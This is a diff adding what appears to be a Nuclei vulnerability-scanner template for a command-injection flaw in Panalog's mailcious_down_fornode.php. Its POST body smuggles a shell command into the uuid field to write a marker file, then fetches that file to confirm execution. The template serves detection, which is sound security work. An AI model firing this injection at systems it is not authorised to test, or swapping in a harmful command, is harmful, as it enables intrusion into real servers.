@@ -1,0 +1,34 @@
+id: Panalog-mailcious_down_fornode-rce
+
+info:
+  name: Panalog-mailcious_down_fornode-rce
+  author: Panalog-mailcious_down_fornode-rce
+  severity: Critical
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+  suijizif: "{{to_lower(rand_base(18))}}"
+
+http:
+  - raw:
+    - |
+      POST /mailcious_down_fornode.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143
+      Accept-Encoding: gzip, deflate, br
+
+      action=check&uuid=;echo '{{suijizif}}'>{{filename}}.txt
+
+    - |
+      GET /{{filename}}.txt HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"{{suijizif}}")
